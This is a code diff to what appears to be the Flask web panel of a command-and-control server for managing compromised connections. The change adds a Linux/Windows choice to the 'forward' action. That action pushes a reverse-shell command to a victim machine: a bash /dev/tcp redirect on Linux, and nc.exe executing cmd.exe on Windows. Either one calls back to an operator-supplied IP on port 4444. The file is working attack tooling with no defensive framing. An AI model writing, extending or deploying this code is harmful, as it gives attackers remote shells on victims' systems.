@@ -43,7 +43,7 @@ HTML_TEMPLATE = """
             event.preventDefault();
             var form = event.target;
             var data = new URLSearchParams(new FormData(form)).toString();
-            sendRequest('/forward', data, 'Forwarding command sent');
+            sendRequest('/forward', data, 'Command sent');
         }
 
         document.addEventListener('DOMContentLoaded', function() {
@@ -80,8 +80,12 @@ HTML_TEMPLATE = """
                     <div style="display: inline-flex; flex-direction: column; align-items: flex-end;">
                         <form action="/forward" method="post" style="display: inline;">
                             <input type="hidden" name="id" value="{{ id }}">
-                            <input type="text" name="forward_ip" placeholder="Forward IP" required style="margin-bottom: 5px;">
-                            <input type="submit" value="Forward" style="background-color: #007bff; color: white; border: none; padding: 5px 10px; cursor: pointer; margin-bottom: 5px;">
+                            <input type="text" name="forward_ip" placeholder="Forward IP" required style="margin-bottom: 5px; width: 150px;">
+                            <select name="command" required style="margin-bottom: 5px;">
+                                <option value="linux">Linux Command</option>
+                                <option value="windows">Windows Command</option>
+                            </select>
+                            <input type="submit" value="Forward" style="background-color: #007bff; color: white; border: none; padding: 5px 10px; cursor: pointer;">
                         </form>
                     </div>
                     <form action="/drop" method="post" style="display: inline;">
@@ -95,7 +99,6 @@ HTML_TEMPLATE = """
     </div>
 </body>
 </html>
-        
 """
 
 # Route to display the web interface
@@ -120,14 +123,20 @@ def drop():
 def forward():
     conn_id = request.form['id']
     forward_ip = request.form['forward_ip']
+    command_type = request.form['command']
     
     conn_id = int(conn_id)  # Convert ID to integer
     if conn_id in connections:
         conn, addr = connections[conn_id]
+        if command_type == 'linux':
+            command = f'bash -c "bash -i >& /dev/tcp/{forward_ip}/4444 0>&1"'
+        elif command_type == 'windows':
+            command = f'C:\\Windows\\Temp\\nc.exe -e cmd.exe {forward_ip} 4444'
+        else:
+            return "Invalid command type"
         try:
-            command = f"nc {forward_ip} 4444 -e /bin/bash"  # Default to Bash reverse shell
             conn.sendall(command.encode('utf-8') + b'\n')
-            return "Forwarding command sent"
+            return "Command sent"
         except Exception as e:
             return str(e)
     return "Connection not found"
@@ -177,4 +186,3 @@ def start_c2_server():
 if __name__ == '__main__':
     threading.Thread(target=start_c2_server, daemon=True).start()
     app.run(host='0.0.0.0', port=5000)
-                            
